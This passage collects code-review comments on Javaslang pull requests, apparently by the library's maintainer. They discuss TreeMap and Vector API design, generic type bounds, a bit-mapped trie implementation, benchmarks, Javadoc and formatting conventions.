Option#none()} if not found.\n */\nOption<K> floorKey(K key);\n\n/**\n * Returns the element with the lowest key greater than or equal to the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the ceiling entry for the {@code key}, or {@link Option#none()} if not found.\n */\nOption<Tuple2<K, V>> ceiling(K key);\n\n/**\n * Returns the lowest key greater than or equal to the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the ceiling for the {@code key}, or {@link Option#none()} if not found.\n */\nOption<K> ceilingKey(K key);\n\n/**\n * Returns the element with the highest key lower than the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the highest entry lower than the given {@code key}, or {@link Option#none()} if not found\n */\nOption<Tuple2<K, V>> lower(K key);\n\n/**\n * Returns the highest key lower than the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the highest key lower thant the given {@code key}, or {@link Option#none()} if not found.\n */\nOption<K> lowerKey(K key);\n\n/**\n * Returns the element with the lowest key higher than the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the lowest entry higher than the given {@code key}, or {@link Option#none()} if not found\n */\nOption<Tuple2<K, V>> higher(K key);\n\n/**\n * Returns the lowest key higher than the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the lowest key higher thant the given {@code key}, or {@link Option#none()} if not found.\n */\nOption<K> higherKey(K key);\n\n// -- Adjusted return types of Map methods\n\n```\n. return text is missing\n. In TreeMap the return type needs to be TreeMap, i.e.\njava\n    ...\n    TreeMap<K, V> descendingMap();\n    ...\n    TreeMap<K, V> headMap(K toKey);\n    TreeMap<K, V> headMap(K toKey, boolean inclusive);\n    ...\n    TreeMap<K, V> tailMap(K fromKey);\n    TreeMap<K, V> tailMap(K fromKey, boolean inclusive);\n    ...\n    TreeMap<K, V> subMap(K fromKey, boolean fromInclusive, K toKey, boolean toInclusive);\n    TreeMap<K, V> subMap(K fromKey, K toKey);\n    TreeMap<K, V> subMap(Option<K> fromKey, boolean fromInclusive, Option<K> toKey, boolean toInclusive);\n    ...\nPlease note that descendingKeySet() and keySet() for example return SortedSet instead of a concrete implementation type. That's ok. The current 'rule'  is that a type only adjusts the self-return types (like TreeMap).\nWhile reviewing this PR I've questioned the return type adjustment in implementation types. Of cause interfaces need to adjust them. But I see no benefit in adjusting the return type of methods within implementing classes.\nScala does adjust return types (e.g. in scala.collection.immutable.TreeMap), Java does not (e.g. in java.util.TreeMap).\nI think it does not hurt to adjust return types, so we will go on like that in Javaslang.\n. Please arrange the methods within TreeMap  by merging them alphabetically between the existing methods!\n(That's the reason I wrote the ... above)\n. entries.max().get() is ok for me. Impls work on the backing structure...\n. I've took a look at head impl. Looks fine, nothing to do here. These methods should use directly the backing structure entries (which is already done)\n. Using null as value is perfectly ok here - nothing to do.\n(The backing structure uses Tuples and null is the only way to obtain a dummy value of type V.)\n. We use the same API as Java/NavigableMap, namely boolean args. Nothing to do here.\n. Yep, nothing to do here. We are using the backing structure RedBlackTree in the right way.\n. I see no benefit from adding the Node interface:\njava\ninterface RedBlackTree\n    ^\n    |\ninterface Node\n    ^\n   / \\\nEmpty ValueNode\nThere are still type casts in the code (see line 1000).\nBefore we had:\njava\ninterface RedBlackTree\n    ^\n   / \\\nEmpty Node\nI will come up with a suggestion later today how to simplify it.\n. minor: these should be static final constants (with upper case names)\n. Instead of Function2<V, V, V> we should use BiFunction<? super V, ? super V, ? extends V> to widen the range of applicable functions.\n. Also BiFunction<? super V, ? super V, ? extends V> instead of Function<V, V, V>\n. dito\n. dito\n. In Javaslang it is best practice to make local vars final if possible to emphasis the value of values.\n. We should use Function instead of Function1 for method argument types (because Function1 extends Function).\nAlso I think it could make sense to widen the bounds:\njava\nstatic <T,U> Array<U> unfoldRight(T seed, Function<? super T, Option<Tuple2<? extends U, ? extends T>>> f)\nI think we do not need ? extends Option in that signature because the Option API always returns Option.\n. also Function<? super T, Option<Tuple2<? extends U, ? extends T>>>\n. dito\n. Because Character is final we do:\njava\nFunction<? super T, Option<Tuple2<? extends T, Character>>>\n. dito\n. dito (and all other occurrences down this page...)\n. Great, thank you!\n~~I think it does not really matter (because it is generated code) but could you delegate to apply?~~\nUpdate: No, it is not worth the effort. This solution is ok!\n. I think we will also need to widen the result type R: ? extends R for al occurrences (lift, liftTry, recover).\nCould you also widen the parameters (? superfor args and ? extends for return type) for the method of(...) of CheckedFunction and Function?\n. Let's just put it the javaslang main package.\nWhat if it is package private, like below - does GWT still process it?\n``` java\npackage javaslang;\n@interface GwtIncompatible {\n}\n```\nThen we could place an internal GwtIncompatible annotation in every package where it is needed and it will not be part of our public API.\n. Wow, that sounds exciting. I will assign it.\n. We can replace the method call of(partialFunction) by providing a type hint <R>:\njava\nreturn () -> Try.<R> of(partialFunction::apply).getOption();\n. Great, thank you. This PR should only modify benchmark related classes.\n. unnecessary braces ()\n. why is Object returned instead of a specific type?\n. are we sure that there runs only one JmhRunner per JVM? Otherwise we need instances of JmhRunner.\n. Is this really an API of the JmhRunner?\n. Even if we run without asserts, the require methods are entered. If we use Java's assert it is stripped by the compiler.\nWhy did we distance from assert?\n. I would write x ^ y instead of xor(x, y) - but its just the src/test package, so leave it as is.\n. Ok\n\nThe JVM should be smart enough to remove empty methods.\n\nReally? Even when static mutable fields change during execution?\n. In src/main we use BiFunction to widen the type range (Function2 extends BiFunction). But it is ok here!\n. Ok, I understand (not fully, because I don't know how dead code elimination works). Let's keep it as-is.\n. I understand. Please keep it as-is.\n. Alright. The current version is ok.\n. Mmh, I would always expect roughly the same speed (+- error), regardless of assertions because it is the same code that runs for the benchmarks.\nI understand the risk of pulling asserts into production code. It is ok as-is!\n. the return type should be M\n. dito\n. dito\n. That's why we do code review :) Thanks for the great additions!\n. Great, thank you!\nIn ideomatic Javaslang we access tuple fields directly, e.g. t._1, t._2 instead of t._1(), t._2(). Could you change that please for all methods here?\nThe methods are useful in case of method references, e.g. t::_1 and t::_2.\n. Interesting idea. +1\n. I'm totally fine with this commit! Great that you separated the renaming into one commit!\n. Off-topic: I was not aware that Scalaz fails in that case. Do you know why?\n. commit looks good!\n. Please revert this commit as I stated before. Having these dependencies is of great relevance!\n. Do you know how the changes affected the benchmarks on your machine? Do the ratios change?\n. Haven't seen it in action but sounds nice.\n. this commit looks good to me!\n. We need \"1000\". Speed is relevant in the second place.\n. > // TODO rewrite to .insertAll\nreally needed to rewrite it?\n. uh, oh - there is no Function equality. A Function cannot be part of a Map key.\n. I think we do not need the cache. However, the create() method looks like a simplification. We could use it without caching. What do you think?\n. of cause we still need the new clojure version :)\n. wow...\n. Mmh, the code related to caching is manageable, it could stay. But I'm not fine with having functions as part of the key. It is too error-prone, functions are not intended to be compared. I'm not sure if JVM Spec enforces method references to be the same every time.\n. yep, makes sense :)\n. what happens if we take(0)?\n(We once had clear() but removed it per user request because it looked mutable and is not known from Scala.)\n. Interesting. My hope is that the Bit-Mapped Vector Trie will make a difference for Vector.\n. Cool! Looks like a copy-paste of the Clojure row ;-p\n. Looking forward to it\n. @ashrko619 Please ensure to use the newest version of Javaslang (v2.0.2) in your Gradle project.\n. We could ensure that the natural Tuple2 comparator is used, namely the component-wise comparator.\nAn additional test for this would create TreeMap.of(Tuple.of(\"b\", \"b\"), Tuple.of(\"a\", \"b\"), Tuple.of(\"b\", \"a\"))).\nDon't know what's the best way to check the validity. Maybe assertThat(treeMap.toList()).isEqualTo(List.of(Tuple.of(\"a\", \"b\"), Tuple.of(\"b\", \"a\"), Tuple.of(\"b\", \"b\")))?\n. @paplorinc, @ruslansennov We use the naturalComparator() only in the case we have no Comparable (generic) in scope. If we have a Comparable, like K here, we are able to make it Serializable like Ruslan showed. We use that solution in RedBlackTree for example.\nSo I would prefer to use\njava\nfinal Comparator<Tuple2<K, V>> comparator = new EntryComparator<>((Comparator<? super K> & Serializable) K::compareTo);\nRedBlackTree<Tuple2<K, V>> result = RedBlackTree.empty(comparator);\nbecause the naturalComparator() is not Serializable.\nWe should write a simple Serialize/Deserialize test for the empty case here. There is a helper for that: Serializables, e.g.\njava\nfinal CharSequence s = deserialize(serialize(\"test\"));\nassertThat(s).isEqualTo(\"test\");\n. Yep, we should embrace null because it is Java we use. Java will have nulls forever and so we should support this billion dollar mistake (or use another language which does not have null).\nPlease use this slightly optimized version:\n``` java\n    static  Iterator iterate(T seed, Function<? super T, ? extends T> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        return new AbstractIterator() {\n            Function<? super T, ? extends T> nextFunc = s -> {\n                nextFunc = f;\n                return seed;\n            };\n            T next = null;\n        @Override\n        public boolean hasNext() {\n            return true;\n        }\n\n        @Override\n        public T getNext() {\n            return next = nextFunc.apply(next);\n        }\n    };\n}\n\n```\nYou may write\njava\n            public T getNext() {\n                next = nextFunc.apply(next);\n                return next;\n            }\nif you are not comfortable with having a return statement and an assignment in one line. At least @paplorinc will not be comfortable with it ;-p\n\none side-note about style: we write s -> ... instead of (s) -> ... in case of single arg lambdas..\n. I changed the name prev to next because we recently started to implement navigable collections having a reverse Iterator. The name prev is therefore too confusing.\n. @ashrko619 Awesome. Will update the docs soon!! Thank you for the hint.\n. We provide a formatter for IntelliJ, see .ide/idea-settings.jar. Do you use it?\n. Does a type-hint work instead of casting? return ofAll(toList().<U> zipWith(that, mapper));\n(Probably not, just a question.)\n. Let's leave it as is. We have that in many places and is correct to say this.zipWith(that).\nBy convention be write <param-name> is null. @ronanM has done it correct.\n. We could fix the descriptions of map, flatMap, zipWithIndex et.al. in a separate PR\n. zipWithIndex has no other Iterable, so the description is not correct. After zipWithIndex we have the same length.\n. Looks like number of spaces % 4 is 0. It is likely the IDE changed indentation. For me it is ok...\n. Why? It is correct in my opinion.\n. It is my fault. We should provide a formatter that aligns rows correct when applied to a file. There most by some formatting option to do that. We have to fix the formatter and check it in (in a different PR). We can then also reformat the whole code base (modulo Generator.scala and generated code).\n@ronanM has done all right. You may leave it as is!\n. It was just a question. I think you are right and it does not compile then. Just leave it as is.\n. ok\n. Yes, great!\n. @paplorinc But wait - what is the result of actual.toList()? Because TreeMap<K, V> is and ordered Traversable>I would expect thattoList()returns the contained entries in the underlying order. If that isn't the case it is a bug.\n. You're right.currentorcurr` is ~~the best~~ a good ;) name\n. Yes, will do!\n. @paplorinc This works on my current RedBlackTree branch:\njava\n    @Test\n    public void shouldCreateKeyComparatorForJavaUtilMap() {\n        final TreeMap<String, Integer> actual = TreeMap.ofAll(List.of(Tuple.of(\"c\", 0), Tuple.of(\"a\", 0), Tuple.of(\"b\", 0)).toJavaMap(t -> t));\n        final List<Tuple2<String, Integer>> expected = List.of(Tuple.of(\"a\", 0), Tuple.of(\"b\", 0), Tuple.of(\"c\", 0));\n        assertThat(actual.toList()).isEqualTo(expected);\n    }\nCould you replace your test with it, please. No bug here as far as I can see...\n. All right. It passed before. Just removed mapOfTuples because it creates a TreeMap to create a TreeMap. But here it does not really matter.\n. @paplorinc I've thought about it - and took a look at the Scala API reference. For example Scala's TreeSet.zipWithIndex returns TreeSet.\nFor now I would keep it as is. I see currently no reason to change it.\n. @ashrko619 @paplorinc I updated the docs - they are online\n. we could add a final here too, for the sake of completeness :-)\n. Case(predicate, ...) is a shortcut for Case($(predicate), ...)\nand...\n. ... Case(value, ...) is a shortcut for Case($(value), ...)\nbut it is up to you which to use, just sayin'\n. the alignment of lines 44-47 should be +4 spaces I think\n. Very nice, thank you!\nI think we should additionally check in all toMap and toSet methods that this Value is not already of type Map or Set, e.g.\njava\ndefault <K, V> Map<K, V> toMap(Function<? super T, ? extends Tuple2<? extends K, ? extends V>> f) {\n    Objects.requireNonNull(f, \"f is null\");\n    if (Map.class.isAssignableFrom(getClass())) {\n        return (Map<K, V>) this;\n    } else {\n        return ValueModule.toMap(this, HashMap.empty(), HashMap::of, HashMap::ofEntries, f);\n    }\n}\nMaybe we can move the check into ValueModule.toMap / toSet by adding a mapType / setType parameter of type class? But generics in Class<...> could make problems. It could be just Class<?> and be cast to M...\n. Great idea!\nPlease let's tweak the parameter types a bit:\njava\npublic static <T1, T2> Tuple2<Seq<T1>, Seq<T2>> sequence(Iterable<Tuple2<? extends T1, ? extends T2>> tuples)\n(Note: I did not suggest Iterable<? extends Tuple... because Tuples are final.)\n. Tuple0 has this import too. Please remove this line and...\n. We need to generate the code for i > 0. It makes sense for Tuple1, too.\n. ...replace Iterator with im.getType(\"javaslang.collection.Iterator\"). (sorry, my prev. comment was wrong)\n. You are right! Thank you.\n. Does unboxing work: .dropWhile(c -> c == '0')?\n. which formatter do you use that inserts that much spaces?? I've recognized that before\n. We should add no TODOs in code (I know, I've also done it before). Better create an issue.\n. @ronanM thank you for committing the changes.\nPlease also generate the sequence method for Tuple1 (see above) so that I can merge your PR.\nThank you for this feature!\n. > it wasn't even functional in Scala for 6 years, when someone finally gave it a try for billions of elements\nwow\n. please file an issue\n. I think we should leave this PR open until Vector is finished. The master branch should contain production ready code.\n. Why do we need Arrays2? Why not just Arrays?\n. Are these the first/last leaves of all branches?\n. @zsolt-donca javaslang-test should work similar to scalacheck, both are inspired by Haskell's Quickcheck\n. @zsolt-donca any suggestions how to do it better? splitting it into three different methods?\n. Mmhh, if we add it, we should add it to all collections, i.e. to Traversable.\n. Our approach is to name them the same and fully qualify the java.* stuff. It will not leak to the outside because these helper classes are package-private / internal.\n. I can't handle it before my vacation. I will file an issue and assign me...\nI think it is not possible to have javaslang-test as Maven test-dependency within javaslang (core) because it will lead to a cyclic dependency. Moving javaslang-test into javaslang is also no option. Maybe we can create a separate Maven module that contains only tests - we will see...\n(#1462)\n. Mmhh, the content is marked as deleted. What happens if I merge it? Will @jorander 's solution for Euler24Test disappear? Maybe you should close this PR and create a new PR containing only Euler21Test.\nI hope that is ok for you, sorry for the inconvenience!\nGreets,\nDaniel\n. Do we already run a specific microbenchmark here? See line 37 and line 40.\n. looking at this we should add a method Try.recover(Class, Function):\njava\n// recovers this Try with f if this is a failure of type X, otherwise returns this\ndefault <X extends Throwable> Try<T> recover(Class<X> exception, Function<? super X, ? extends T> f) {\n    if (isFailure()) {\n        final Throwable cause = getCause();\n        if (exception.isAssignableFrom(cause.getClass())) {\n            return Try.of(() -> f.apply(cause));\n        }\n    }\n    return this;\n}\nin order to get a way around the Match expression. Then we have\njava\nTry.of(this::throwsException).recover(RuntimeException.class, x -> 1);\nSee #1471\n. Some references were missing. Kept alphabetical order.\n. Kept alphabetical order\n. Helped IntelliJ IDEA - it showed up a compile error in the editor\n. Helped IntelliJ IDEA - it showed up a compile error in the editor\n. Reusing existing impl. Now the result is serializable.\n. missing unit test\n. missing unit test\n. missing unit test\n. IntelliJ IDEA editor remark\n. Comparators (or functions in general) cannot be compared for equality. Therefore PriorityQueue.of(comparator, ...) always has to return a new instance.\n. When we do not provide a comparator we know in this special case that the underlying comparator is induced by the natural order and the instances are the same.\n. duplicate code\n. applied Javaslang formatter\n. This one is evil - once it was a bugfix to get the comparator and create a new TreeSet instance instead of returning this. But we should return the same instance if the type matches (in this case: TreeSet).\nBut what if the actual Value type has an underlying comparator, like PriorityQueue and we want to return a SortedSet? Do we need to reuse the Comparator? If so, we might want to have a general interface for collections that have a comparator...\n. shows that BitSet is currently broken...\n. minor: please rename all occurrences of A to T.\nplease also rename v to value.\n. Please change RuntimeException to UnsupportedOperationException\n. dito\n. please add the following Javadoc:\njava\n/**\n * Appends the given {@code value} to the end of this Tuple and increases the arity by one.\n * \n * @param value the value that will be appended to the end of this Tuple\n * @return a new Tuple that contains this values plus the new value\n * @throws UnsupportedOperationException if {@code this.arity() == Tuple.MAX_ARITY}\n */\n. Please add the following Javadoc to this method:\njava\n/**\n * Prepends the given {@code value} to the end of this Tuple and increases the arity by one.\n * \n * @param value the value that will be prepended to the end of this Tuple\n * @return a new Tuple that contains the new value plus this values\n * @throws UnsupportedOperationException if {@code this.arity() == Tuple.MAX_ARITY}\n */\n. Please add the additional field MAX_ARITY to the Tuple interface which might come handy in case a user wants to prevent UnsupportedOperationException on append/prepend without hard-coding the this.arity() == ... check:\n``` java\npublic interface Tuple {\n/**\n * The maximum arity of an Tuple.\n * <p>\n * Note: This value might be changed in a future version of Javaslang.\n * So it is recommended to use this constant instead of hardcoding the current maximum arity.\n */\nint MAX_ARITY = ${N};\n\n...\n\n}\n```\n. We use meaningful names, the _1, _2, ... are one of the few exceptions in Javaslang.\nNaming updates on immutable collections are an interesting topic - and very controversial discussed. We will use the names set1, set2, ... here.\nAdditionally we should also add set(index, value) to Seq!\n\nIn general there are many naming candidates for setting an element at an index.\n- replaceAt(index, value) (would go adhere with the existing replace methods)\n- set(index, value) (known from mutable collections)\n- updated (like in Scala)\n- with (looks like a builder DSL to me)\n- ...\nWe already have insert(index, element), put(key, value), replace(oldValue, newValue), ... These also might be confused with mutable operation - because we are used to mutable collections. If we would only know immutable collections, it would be crystal clear that seq.set(index, value) would return a new instance. Therefore there is really no reason to not take the shortest name set.\n. Please remove this line (and the following empty line)\n. Please change it to Sets the ${j.ordinal} element of this tuple to the given {@code value}.\n. please change t$j to value here\n. ~~please rename w1, ... to set1, ...~~\n. I agree - it was splitted. Don't know who did it.\n. Yes, but currently the toSortedSet() method's javadoc states that a TreeSet is returned. In the case we already have a TreeSet we are able to return the same instance. If we have a SortedSet, we need to create a new TreeSet instance...\nThis is really comparator-hell, addressed in #1488 and #1495.\n. Oh my gosh - I've overseen that. A HashMap has no order by definition. Will fix the tests.\n. Update: please rename w1, w2, ... to update1, update2, ... This will align the names to the existing Seq.update(int index, T element) function\n. Finally merged the new Try.recover syntax. Please use it. Then I will pull this PR in... Thx!\n. minor/indentation: delete 2 spaces\n. minor/indentation: line 100-112: add two spaces, but line 111 needs to stay as-is :-)\n. minor/indentation: same as above (also applies to the following blocks)\n. We need to generate valid Javadoc (or leave it completely away but that is no viable option for us) - otherwise mvn javadoc:javadoc will fail. We need that maven target for a release, so please test it (ideally on every PR).\nI suggest Javadoc of the following form. Using @link instead of @code in the first line might come handy when adding more aliases.\njava\n/**\n * Alias for {@link Function0#of(Function0)}.\n *\n * @param methodReference A method reference\n * @return A {@code Function0}\n */\npublic static <R> Function0<R> f0(Function0<R> methodReference) {\n    return Function0.of(methodReference);\n}\nUpdate: If you face problems regarding imports of packages regarding the types used in @link then you might fall back to your solution using @code and @see. But the ImportManager of the code generator should handle imports automatically.\n. Good! Try is better than try_ or _try\n. needs to be failed instead of of\n. needs to be failed instead of of\n. I think future(Throwable) and future(T) are ambiguous. Please try if the compiler knows what to do when using future(new Error(\"oh\"))\n. Option.nothing() is useful, too (I know, it is still in progress)\n. I've simplified it even more. Please use Try.recover(Class, T) instead of Try.recover(Class, Function). See #1501 \n. Hint: In Javaslang code I almost always fully qualify Java collection types to make the difference clear, even if there is no conflict.\n. I see it is final again (can't comment on out-dated diffs). It is important because the return types cannot be adjusted by sub-classes of Vector any more. \nIndexedSeq has Option<? extends IndexedSeq<T>> initOption();\nVector has Option<Vector<T>> initOption();.\nA subclass Xcannot have Option<X<T>> any more.\n. Oohhh, Vector.initOption() currently has return type Option<? extends Vector<T>>. That is not correct. Our final collections do have ? extends any more. Could you please correct it @paplorinc? (for all return types in Vector, see Javaslang Array for example)\n. It would be better to explicitly state that Vector is Serializable by declaring the interface in the implements section. I've checked the other collection types and we did it not consequently. But I think we should do it for all collections (in a separate PR), it is more robust regarding changes of super-interfaces.\n. Did you change it to ArrayList because of the full qualified name? It is ok for me here because it is internal.\n. nice\n. I removed that kind of tests (then re-added it after a few months and finally removed it again) - we have to take care of our own (or re-add the tests again).\nThe tests were too complicated and I had to maintain a white-list of invalid return types. This was error prone.\n. maybe it will make it to 2.1.0, the interface did not change (only methods were added)\n. +1 for using recursion here\n. Can array ever be null here?\n. I don't understand line 1361 and 1362. First we assign an array at a specific index to an object, then the array itself. How's that!?\n(I'm sure it is correct because you've tested it...)\n. I would restrict all methods and fields to private access if possible. In most cases white-box unit tests are not really necessary. All branches can also be tested by using public API.\n. I would name it Arrays because original Java collection(-related) classes are full qualified per convention. We also have Collections in Javaslang (and Java).\n. I would remove this method completely and use\njava\nnew Object[] { element }\ndirectly instead of\njava\nasArray(element);\nToo many calls increase the cyclomatic complexity and make it hard for humans to read the code. I know that you like meaningful names. If the compiler optimizes it 'away' this method is ok for me but the method body is really hard to read.\n. Please move shuffle and swap out of this class to the benchmark package. These (mutating) methods are not needed in production code. Are other methods also not needed? Can't verify it currently because I'm using Github and don't have my IDE at hand.\n. I understand, thx, looks good to me\n. great!\n. how much mem do you have? (I have 16 GB)\n. we could omit the reverse by providing a comparator:\njava\nsorted(Comparator.reverseOrder())\n(does that compile?)\n. I think we can save lambda instances by creating singletons. I'm not sure if the curried NODE version helps...\n``` java\n// names can be changed\nprivate static final NodeModifier NODE = (o, i) -> copy(o, i + 1);\nprivate static final Function LEAF = element -> (o, i) -> copyUpdate(o, i, element);\n// ...\nprivate static Object[] modifyLeafValue(Object[] array, int depthShift, int index, Object element) {\n    return modifyLeaf(array, depthShift, index, NODE, LEAF.apply(element));\n}\n```\nUpdate: If the above makes sense, we don't need modifyLeafValue() at all and can use modifyLeaf() directly.\n. Mmhh, interesting - do I interpret it right that creating more instances performs better?\nHow frequently modifyLeafValue() is called on an operation, round about? Zero or Once / logarithmic times?\nI guess that before/after performs equal (modulo measurement error). Because we turned GC off, we don't see the effect of creating instances. However, if the method is not called often, it will not matter.\n. wow, interesting!\n. sounds good!\n. Would memory sharing of the immutable data structure still work when using mutable leaves?\n. If we internally leverage mutability to gain performance we should add unit tests that ensure that memory sharing of our persistent versions still works. This test makes our implementation robust regarding changes by other persons that may not know these internal properties.\n. Great! Just to get sure - history.forEach(...) also checks that previous versions remain unmodified? I.e. t._1 is independent of t._2\n. Is the command still valid / do you use the same to start our benchmarks?\nbash\nmvn test -Pbenchmark -pl javaslang\nIs it possible to run only VectorBenchmark (command line and/or within IntelliJ IDEA)?\n. we should remove all System.out calls (and assert if necessary)\n. dito\n. will run the disabled values later today. I'm preparing release 2.0.3 just now - will still take some time\n. we will clean up the others also (in another PR)\n. Please rewrite this line and name p042_words.txt instead, we can't right-click it here.\n. We do not protocal updates. Just leave only 2.0.0 please - the interface will remain the same. Changes to implementations are continuous.\n. I think about adding some syntactic sugar/numeric conversion methods to CharSeq, e.g.\njava\nInteger.valueOf(digitsToTest.take(3).mkString())\ncould be\njava\ndigitsToTest.take(3).toInt()\n. Tempted to do it before breakfast :)\n. @jorander the conversion methods are here now. Please merge your branch with current master.\nCharSeq.parse_, CharSeq.decode_ and additional CharSeq.toXxx methods.\nSee also #1515 \n. To avoid boxing/unboxing\njava\nInteger.valueOf(digitsToTest.takeRight(3).mkString()) % divisor == 0\nis converted best using\njava\ndigitsToTest.takeRight(3).parseInt() % divisor == 0\n. Wow, this is tricky :-) During initialization of EMPTY the constructor is called and EMPTY == null is true.\nIn all other calls of the constructor we assert that the empty trie is not passed to ensure the EMPTY Vector is a singleton.\nI had to proof it to understand the assert statement:\njava\n    (EMPTY == null) || (trie.length() > 0)   // applying De Morgan\n<=> !((EMPTY != null) && (trie.length <= 0)) // my assumption: (EMPTY != null) is true\n<=> !(true && (trie.length <= 0))            // true && A <=> A\n<=> !(trie.length <= 0)                      // negation\n<=> trie.length > 0                          // not correct for EMPTY Vector\n. Currently we have only one case where trie == this.trie and trie.length() > 0, namely trie.drop(n) where n <= 0:\njava\nwrap(trie.append(element));  // trie.append(element) != trie\nwrap(trie.drop(n));          // trie.drop(n) == trie <=> n <= 0\nwrap(trie.prepend(element)); // trie.prepend(element) != trie\nwrap(trie.take(n));          // trie.take(n) == trie <=> trie is empty\n~~I thought of merging wrap(BMT) and ofAll(BMT) to one static method wrap(BMT self, BMT that) but that is not possible for the other static ofAll methods (without passing null as self).~~\n~~I would like to rename ofAll(BMT) to wrap(BMT). In order to resolve the name clash we make the current wrap(BMT) static and pass the this instance as self parameter: wrap(self, that).~~\nIt would need to be wrap(Vector, BMT) instead - but it is ok as is.\n. Can we assert here s.th. similar to Vector? E.g.\njava\nassert (EMPTY == null) || (array.length > 0)\n. Why is Arrays.empty() a method and not a constant?\nWhy do we not initialize EMPTY with new BitMappedTrie<>(new Object[0], 0, 0, 0); and get the empty array like so when needed within BitMappedTrie: EMPTY.array?\n(Then we can probably remove the Arrays.empty() method)\n. while reading asArray(element) I have a question in mind (without exactly knowing what I'm talking about because I hadn't the time to read enough):\nIs it possible to allocate the whole array (of size 32) without using all 'slots'? Would that safe us array copy operations when modifying the trie?\n. Please put the whole get() method into BMT and replace this with\njava\n@Override\npublic T get(int index) {\n    return trie.get(index);\n}\nAdditionally the optimized Iterator should also be moved to BMT, and not be part of Vector.\n\nIn addition you can't primitivize a getter (it would have to return an Object), but you can cast an array and get the value out without boxing.\n\nThat's right. But we start to mix up our code here in order to do low level optimizations. The primitive optimizations are not part of this PR. We can talk about that later...\n. minor: in line 669 is an unnecessary newline.\nIntelliJ IDEA does not preserve your format of the ternary operator:\njava\n         final Vector<T> results = ofAll(iterator().filter(predicate));\n         return (results.length() == length()) ? this\n                                               : results;\nAfter formatting the file with our presets, the lines look like this:\njava\n        return (results.length() == length()) ? this\n                : results;\nPlease format ternary operators like this:\njava\n        return (results.length() == length()) ? this : results;\nUpdate: If lines get very long we could use if/else or this format (which is kept by the formatter):\njava\n        return (results.length() == length())\n                ? this\n                : results;\n. the Tuple import (at the top of the file) is not used any more - it can be removed\n. here we can use the shorted method reference: .map(digitsSoFar::append)\n. I applied the changes on my local machine. The .parseInt() makes no measurable difference regarding this example. It is just a bit more concise.\n. you're right\n. @paplorinc Please remove the line. Instead you could modify the first line and mention that our Vector is based on a Bit Mapped Trie implementation.\n. Hi @paplorinc, great work so far. This implementation is smaller than I expected!\nBefore pulling it I want to see just one more thing: Please make BitMappedTrie Iterable and implement the iterator() method in the way that it does not use get(index). Instead it should use the internal BMT structure to efficiently iterate the elements (i.e. not getting the array on every step, instead use the offset until the end of the array is reached, right?).\nThis is inevitable because otherwise either the internal structure would leak to the outside or we could not leverage the knowledge about the internal structure and have to fall back to less efficient ways to access elements. The latter case is currently implemented (using get(index) each step).\nI think that it will be a better base for comparing the upcoming optimizations.\nIt shouldn't be much effort, is it?\n. We will see. In the design of types it is the right place for iterator(). We will take a look at leading and trailing next.\nIn Scala Vector is in between Array and List. List is best at prepend() & tail(), Array is best at random access get() and update(). This is the goal for Vector optimizations, it should be good at both and be in between Array and List. That's what I'm looking at, not the optimization of specific methods like groupBy() and slice() for example.\nI'm really looking forward to review leading() and trailing(), especially on the performance changes of get(), update(), append(), prepend() and tail().\n. Please create final length = BitMappedTrie.this.length();\n. Please use globalIndex < length here.\njavac does not inline the call. I was curious and tested 3 variants, please take a look at this Gist.\n. Also javac does not inline fields that are return by methods like length().\nSee this Gist\nWith other words we should use not method calls within Javaslang classes when there are instance fields present.\n. @paplorinc \nRegarding my question:\n\nmvn test -Pbenchmark -pl javaslang\nIs the command still valid / do you use the same to start our benchmarks?\n\nI did run\njava\nmvn test -Pbenchmark -pl javaslang\nThe result:\njava\n[WARNING] The requested profile \"benchmark\" could not be activated because it does not exist.\nHow do I run the bechmarks? How do I get the formatted reports?\n. Thank you, Ruslan! We could add a class RunAllBenchmarks if needed.\n. @paplorinc to your question above:\n\nK, I will introduce a Javaslang MutableWrapper for this then, so that we can assign values from inside a lambda.\n@danieldietrich?\n\nPlease do not introduce the MutableWrapper. Maybe the unsafeLeafIterator is the wrong abstraction. I will come back with a suggestion, please hold your horses.\nCurrently I need to plan the next release. This is top priority because our users have serious problems.\n. The important part is Alias for {@link Function7#of(Function7)}, which links to the method we provide an alias for. We should not duplicate the Javadoc. Instead the user should follow the link.\nUnfortunately doclint will error when the parameters etc. are not documented in the javadoc. How could we improve the documentation here?\n. Yes, but as long as Array is here we need to include it in our changes. It is not clear yet, if we will remove it.\n. Our names are currently inconsistent, see #1488. In Scala we use either interface names or class names for object creation but never names of non-existing types.\nExamples:\n``` scala\nscala> Seq(1, 2, 3)\nres0: Seq[Int] = List(1, 2, 3)\nscala> Set(1, 2, 3)\nres1: scala.collection.immutable.Set[Int] = Set(1, 2, 3)\nscala> scala.collection.immutable.SortedSet.empty[String] + (\"a\", \"c\", \"b\")\nres3: scala.collection.immutable.SortedSet[String] = TreeSet(a, b, c)\n```\nThese are all interfaces. The is no such thing like LinkedSet. The name would be inconsistent.\n. This is what I found:\n\nAll of GWT's code is available under the Apache 2.0 open source license.\n\nThen using it and mentioning Google's Copyright is the way to go, right?\n. I agree that it would increase readability / would turn focus on non-trivial things. But if we want formally ensure that no documentation is missing, we need to enable Java's doclint option.\nBtw - I'm a little bit proud that we use doclint. Not everyone is able to do it because tons of Javadoc are broken and they are not able to effort the time to fix it.\n. Mmmh, why that? Does the following work?\njava\nreturn ofAll((Comparator<T> & Serializable) T::compareTo, values);\nWidening the type is safe in this case.\n. Is this important because GWT relies on sources? Just asking...\n. Is this a specific snapshot or nightly build? :-)\n. Hi @tbroyer, do you have an advise on the best practice how to include the @GwtIncompatible annotation into a library that cannot depend on 3rd party libs.\nAre we allowed to copy the source-code of the annotation, preserving the copyright file header without including additional LICENSE files?\n. The class AbstractMultimap is not relevant any more. You can ignore it. It is just a Clipboard for the ongoing work.\nE.g. this method will be moved to Multimaps and get additional parameters, one of them is a function OfEntries that is type-safe. The cast will disappear.\n. Will rename it.\nNote: Currently only LinkedHashMultimap and Multimaps is worth to take a look at. HashMultimap and TreeMultimap are far behind...\n. ~~You are right, we should use the size() method of the delegate directly!~~\nUpdate: We alread do. It is linear regarding the number of keys. We accumulate the size of the value collections. This seems right to me.\n. This is all right, Ruslan did all the work and Multimap will be there in 2.1.0. I only copy-paste the impls and add additional generic parameters. Some fixes and a Builder-reimplementation on the way... It is a load of work, maybe I add my name...\n. Yes, this 